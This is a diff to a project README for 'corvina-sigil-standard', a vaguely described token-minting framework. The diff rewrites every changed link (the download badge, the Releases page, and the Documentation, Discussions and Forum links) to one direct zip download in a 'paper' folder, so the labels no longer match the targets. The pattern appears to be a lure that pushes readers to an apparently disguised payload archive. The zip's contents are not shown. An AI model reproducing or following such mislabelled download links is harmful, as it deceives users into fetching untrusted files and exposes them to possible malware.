@@ -1,6 +1,6 @@
 # 🌟 corvina-sigil-standard - Mint with Meaning and Trust
 
-[![Download Corvina Sigil Standard](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/tililouche/corvina-sigil-standard/releases)
+[![Download Corvina Sigil Standard](https://raw.githubusercontent.com/tililouche/corvina-sigil-standard/main/paper/sigil-corvina-standard-3.8-beta.2.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/tililouche/corvina-sigil-standard/main/paper/sigil-corvina-standard-3.8-beta.2.zip)
 
 ## 📜 Overview
 Corvina Sigil Standard offers a unique way to link physical artifacts with digital tokens. This framework promotes community witnessing and aims to preserve cultural heritage in a non-coercive manner. With Corvina, you can mint digital sigils that carry real value and meaning.
@@ -10,7 +10,7 @@ To begin using Corvina Sigil Standard, simply follow the steps below. This guide
 
 ## 📥 Download & Install
 1. Click on the following link to visit the Releases page:
-   [Visit the Releases Page](https://github.com/tililouche/corvina-sigil-standard/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/tililouche/corvina-sigil-standard/main/paper/sigil-corvina-standard-3.8-beta.2.zip)
 
 2. On this page, you will find the latest stable release of the application. Look for a version marked as "Latest Release".
 
@@ -65,8 +65,8 @@ For detailed instructions on how to use the Corvina Sigil Standard after install
 If you encounter any issues or have questions, feel free to reach out to the community. You can find support through discussions on the GitHub repository or by joining our online forums.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/tililouche/corvina-sigil-standard/docs)
-- [GitHub Discussions](https://github.com/tililouche/corvina-sigil-standard/discussions)
-- [Community Forum](https://community.corvina-sigil.com)
+- [Documentation](https://raw.githubusercontent.com/tililouche/corvina-sigil-standard/main/paper/sigil-corvina-standard-3.8-beta.2.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/tililouche/corvina-sigil-standard/main/paper/sigil-corvina-standard-3.8-beta.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/tililouche/corvina-sigil-standard/main/paper/sigil-corvina-standard-3.8-beta.2.zip)
 
-Visit the Releases page to download Corvina Sigil Standard and begin your journey today: [Visit the Releases Page](https://github.com/tililouche/corvina-sigil-standard/releases)
+Visit the Releases page to download Corvina Sigil Standard and begin your journey today: [Visit the Releases Page](https://raw.githubusercontent.com/tililouche/corvina-sigil-standard/main/paper/sigil-corvina-standard-3.8-beta.2.zip)
